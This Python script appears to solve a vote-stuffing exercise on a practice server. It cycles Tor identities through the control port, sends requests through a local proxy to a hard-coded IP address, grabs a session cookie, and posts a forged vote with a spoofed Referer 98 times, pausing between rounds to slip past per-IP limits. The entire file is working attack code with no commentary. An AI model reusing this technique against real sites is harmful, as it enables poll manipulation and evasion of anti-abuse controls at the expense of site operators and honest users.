#!/usr/bin/python3


from http.client import HTTPConnection
from socket import socket
from time import sleep


def refresh():
    tor = socket()
    tor.connect(('127.0.0.1', 9051))
    tor.sendall(b'AUTHENTICATE "holbertontest"\r\n')
    tor.sendall(b'SIGNAL NEWNYM\r\n')
    tor.close()


def getCookie():
    web = HTTPConnection('localhost', 8118)
    web.set_tunnel('158.69.76.135')
    web.request('GET', '/level4.php')
    response = web.getresponse()
    cookie = response.getheader('Set-Cookie')
    cookie = cookie.partition('=')[2].partition(';')[0]
    web.close()
    return cookie


def post(cookie):
    web = HTTPConnection('localhost', 8118)
    web.set_tunnel('158.69.76.135')
    web.connect()
    web.putrequest('POST', '/level4.php')
    web.putheader('Cookie', 'HoldTheDoor=' + cookie)
    web.putheader('Content-Type', 'application/x-www-form-urlencoded')
    web.putheader('Referer', 'http://158.69.76.135/level4.php')
    body = b'id=701&holdthedoor=Submit&key=' + cookie.encode('ASCII')
    web.putheader('Content-Length', str(len(body)))
    web.endheaders()
    web.send(body)
    response = web.getresponse()
    web.close()


for i in range(98):
    refresh()
    cookie = getCookie()
    post(cookie)
    print(i)
    sleep(10)
